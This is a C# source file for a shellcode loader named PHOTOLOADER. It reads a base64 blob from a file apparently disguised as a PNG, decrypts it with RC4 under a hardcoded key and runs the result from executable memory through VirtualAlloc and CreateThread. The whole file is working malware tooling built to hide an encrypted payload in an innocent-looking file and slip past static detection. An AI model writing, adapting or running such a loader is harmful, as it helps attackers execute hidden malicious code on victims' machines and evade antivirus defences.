using System;
using System.Text;
using System.Runtime.InteropServices;

namespace PHOTOLOADER 
{

    class Program 
    {


        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(IntPtr Handle, Int32 Wait);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // https://github.com/manbeardgames/RC4/blob/master/RC4Cryptography/RC4.cs
        public static byte[] Apply(byte[] data, byte[] key)
        {
            //  Key Scheduling Algorithm Phase:
            //  KSA Phase Step 1: First, the entries of S are set equal to the values of 0 to 255 
            //                    in ascending order.
            int[] S = new int[256];
            for (int _ = 0; _ < 256; _++)
            {
                S[_] = _;
            }

            //  KSA Phase Step 2a: Next, a temporary vector T is created.
            int[] T = new int[256];

            //  KSA Phase Step 2b: If the length of the key k is 256 bytes, then k is assigned to T.  
            if (key.Length == 256)
            {
                Buffer.BlockCopy(key, 0, T, 0, key.Length);
            }
            else
            {
                //  Otherwise, for a key with a given length, copy the elements of
                //  the key into vector T, repeating for as many times as neccessary to
                //  fill T
                for (int _ = 0; _ < 256; _++)
                {
                    T[_] = key[_ % key.Length];
                }
            }

            //  KSA Phase Step 3: We use T to produce the initial permutation of S ...
            int i = 0;
            int j = 0;
            for (i = 0; i < 256; i++)
            {
                //  increment j by the sum of S[i] and T[i], however keeping it within the 
                //  range of 0 to 255 using mod (%) division.
                j = (j + S[i] + T[i]) % 256;

                //  Swap the values of S[i] and S[j]
                int temp = S[i];
                S[i] = S[j];
                S[j] = temp;
            }


            //  Pseudo random generation algorithm (Stream Generation):
            //  Once the vector S is initialized from above in the Key Scheduling Algorithm Phase,
            //  the input key is no longer used.  In this phase, for the length of the data, we ...
            i = j = 0;
            byte[] result = new byte[data.Length];
            for (int iteration = 0; iteration < data.Length; iteration++)
            {
                //  PRGA Phase Step 1. Continously increment i from 0 to 255, starting it back 
                //                     at 0 once we go beyond 255 (this is done with mod (%) division
                i = (i + 1) % 256;

                //  PRGA Phase Step 2. Lookup the i'th element of S and add it to j, keeping the
                //                     result within the range of 0 to 255 using mod (%) division
                j = (j + S[i]) % 256;

                //  PRGA Phase Step 3. Swap the values of S[i] and S[j]
                int temp = S[i];
                S[i] = S[j];
                S[j] = temp;

                //  PRGA Phase Step 4. Use the result of the sum of S[i] and S[j], mod (%) by 256, 
                //                     to get the index of S that handls the value of the stream value K.
                int K = S[(S[i] + S[j]) % 256];

                //  PRGA Phase Step 5. Use bitwise exclusive OR (^) with the next byte in the data to
                //                     produce  the next byte of the resulting ciphertext (when 
                //                     encrypting) or plaintext (when decrypting)
                result[iteration] = Convert.ToByte(data[iteration] ^ K);
            }

            //  return the result
            return result;
        }
        static void Main(string[] args) {

            string file = $"[PNG PATH HERE]";

            byte[] encrypted = Convert.FromBase64String(System.IO.File.ReadAllText(file));

            byte[] shellcode = Apply(encrypted, Encoding.UTF8.GetBytes("thisisakey"));

            var addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x00001000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            var res = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(res, 0xFFFFFFF);

        }

    }
}
